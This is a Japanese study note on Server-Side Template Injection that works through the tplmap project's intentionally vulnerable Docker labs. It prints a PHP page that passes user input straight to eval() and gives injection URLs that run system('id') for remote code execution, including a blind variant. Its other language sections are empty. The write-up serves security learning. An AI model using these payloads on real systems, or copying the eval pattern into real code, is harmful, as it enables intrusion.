<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Server-Side Template Injection](#server-side-template-injection)
  - [概要](#%E6%A6%82%E8%A6%81)
  - [tplmal (SSTI practice)](#tplmal-ssti-practice)
    - [setup](#setup)
    - [php](#php)
      - [eval](#eval)
    - [Java](#java)
    - [python](#python)
    - [Ruby](#ruby)
    - [Node.js](#nodejs)
- [メモ](#%E3%83%A1%E3%83%A2)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Server-Side Template Injection
## 概要
`<% %>`とかでViewの中に変数のデータを表示させたいときに、ユーザーの入力をそのTemplate構文の中に
入れるとRCEの脆弱性になるかもしれない。python,php,NodeJS,Ruby,Javaなど様々なTemplate構文においてその危険性がある。   

## tplmal (SSTI practice)
https://github.com/epinna/tplmap   
SSTI検知ツールで、各テンプレートエンジンの脆弱な環境もDockerで用意されている。   
### setup
git cloneして、`docker-envs`ディレクトリ下で`docker-compose up -d`でコンテナを全部作成・起動する。   
```txt
docker@default:~$ docker ps
CONTAINER ID        IMAGE                             COMMAND                  CREATED             STATUS              PORTS                              NAMES
73a73451642d        docker-envs_tplmap_test_php       "docker-php-entrypoi…"   About an hour ago   Up About an hour    80/tcp, 0.0.0.0:15002->15002/tcp   docker-envs_tplmap_test_php_1
7d20e65fef72        docker-envs_tplmap_test_node      "/bin/sh -c 'cd /app…"   About an hour ago   Up About an hour    0.0.0.0:15004->15004/tcp           docker-envs_tplmap_test_node_1
ff18ec4758d6        docker-envs_tplmap_test_java      "/bin/sh -c 'cd env_…"   About an hour ago   Up About an hour    0.0.0.0:15003->15003/tcp           docker-envs_tplmap_test_java_1
d345416b4104        docker-envs_tplmap_test_python    "/bin/sh -c 'python …"   About an hour ago   Up About an hour    0.0.0.0:15001->15001/tcp           docker-envs_tplmap_test_python_1
f1a58c98075d        docker-envs_tplmap_test_python3   "/bin/sh -c 'python3…"   About an hour ago   Up About an hour    0.0.0.0:15006->15001/tcp           docker-envs_tplmap_test_python3_1
33eba77b5918        docker-envs_tplmap_test_ruby      "/bin/sh -c 'cd env_…"   About an hour ago   Up About an hour    0.0.0.0:15005->15005/tcp           docker-envs_tplmap_test_ruby_1
docker@default:~$
```
`http://192.168.99.100:15004/ejs?inj=a`とかでアクセスできる！   
### php
#### eval
`http://192.168.99.100:15002/eval.php?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102749953-453b1a00-43a8-11eb-903a-ebbf4ce70376.png)   
evalに`?inj=`の値がそのまま代入されている。   
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

if(!$_GET["blind"]) {
  echo generateRandomString();
  error_log('DEBUG< : ' . $tpl);
  $rendered = eval($tpl);
  error_log('DEBUG> : ' . $rendered);
  echo generateRandomString();
}
else {
  error_log('DEBUG< : ' . $tpl);
  ob_start();
  $rendered = eval($tpl);
  ob_end_clean();
  error_log('DEBUG> : ' . $rendered);
  echo generateRandomString();
}
?>
```
`http://192.168.99.100:15002/eval.php?inj=system(%27id%27);`でRCE！   
![image](https://user-images.githubusercontent.com/56021519/102750083-8e8b6980-43a8-11eb-843f-b4732c36e9f3.png)   
`tpl`の`%s`を`inj`パラメータの値に置き換えるので以下でRCE！   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);`   
blindにすると`id`コマンドの実行結果は見えないが、確かに実行はされている！   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);&blind=1`   
![image](https://user-images.githubusercontent.com/56021519/102750650-87b12680-43a9-11eb-8a7f-b37c06c988c8.png)   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=aaa&blind=1`のようにevalの中でエラーが発生するようにすると、   
![image](https://user-images.githubusercontent.com/56021519/102750727-aadbd600-43a9-11eb-8e51-3fccd25f2ab6.png)   

### Java
### python
### Ruby
### Node.js

# メモ
escapeHTMLってどんな感じでエスケープする？   
動的な文字列連結は脆弱になりがちっぽい   
変数名のワードリストがあるぽい   
# 参考
https://portswigger.net/web-security/server-side-template-injection   
SSTIの概要   
https://portswigger.net/research/server-side-template-injection   
各テンプレートエンジンにおけるSSTIの例   
https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/   
TornadoでのSSTI   
https://github.com/epinna/tplmap   
TPLMAPというSSTI検知ツール。脆弱な環境もテスト用にある。   
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI   
SSTIの脆弱なWebサイト。Docker環境。   
https://www.hamayanhamayan.com/entry/2020/09/10/222147   
SSTIの概要。CTFでのSSTI。   
https://io.cyberdefense.jp/entry/2017/06/12/Server-Side_Template_Injection   
SSTIの説明。日本語。   
https://ierae.co.jp/blog/osc2016do-webappsec/   
SSTIの説明。日本語。   
